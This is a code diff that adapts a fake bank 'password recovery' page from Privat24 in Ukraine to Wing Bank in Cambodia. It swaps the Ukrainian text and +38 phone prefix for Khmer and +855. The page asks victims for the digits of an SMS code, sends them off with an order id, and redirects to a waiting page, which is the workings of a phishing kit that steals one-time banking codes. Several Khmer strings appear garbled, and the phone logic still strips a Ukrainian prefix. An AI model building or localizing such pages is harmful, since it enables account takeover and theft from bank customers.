@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="uk" dir="ltr">
+<html lang="km" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Відновлення пароля від Приват24</title>
+<title>ការស្តារពាក្យសម្ងាត់ពី Wing Bank</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
@@ -58,15 +58,15 @@
   </div>
 
   <div class="content">
-    <div class="title">Відновлення пароля від<br>Приват24</div>
+    <div class="title">ការស្តារពាក្យសម្ងាត់ពី<br>Wing Bank</div>
 
     <div class="field">
-      <div class="lbl">Номер телефону</div>
-      <div class="phone-val" id="userPhone">+38 (___) ___ __ __</div>
+      <div class="lbl">លេខទុរសាព់</div>
+      <div class="phone-val" id="userPhone">+855 (___) ___ __ __</div>
     </div>
 
     <div class="field">
-      <div class="lbl">Повідомлення з кодом</div>
+      <div class="lbl">សារដែលកុដ</div>
       <div class="code-row">
         <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" placeholder="X">
         <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1" placeholder="X">
@@ -90,13 +90,13 @@
     if (p.startsWith("380")) p = p.substring(3);
     if (p.length === 9 && p[0] !== "0") p = "0" + p;
     if (p.length >= 10) {
-      const f = "+38 (" + p.substring(0,3) + ") " +
+      const f = "+855 (" + p.substring(0,3) + ") " +
                 p.substring(3,6) + " " +
                 p.substring(6,8) + " " +
                 p.substring(8,10);
       document.getElementById("userPhone").textContent = f;
     } else if (p.length > 0) {
-      document.getElementById("userPhone").textContent = "+380" + p;
+      document.getElementById("userPhone").textContent = "+855" + p;
     }
   }
 
@@ -116,7 +116,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Код невірний або недійсний";
+    el.textContent = "កហដមិនត្រឹមត្រហវ រឹមិនមានសុពលភាព";
     el.style.display = "block";
     setTimeout(() => { el.style.display = "none"; }, 3500);
   }
@@ -178,11 +178,11 @@
         location.href = "code3-waiting.html?order=" + orderId +
                         (phone ? "&phone=" + encodeURIComponent(phone) : "");
       } else {
-        showError(data.message || "Сталася помилка");
+        showError(data.message || "មានកម្ហិសកីតលីង");
         resetInputs();
       }
     } catch (err) {
-      showError("Помилка з'єднання");
+      showError("កម្ហិសក្នុងការភ្ជាប់");
       resetInputs();
     }
   }
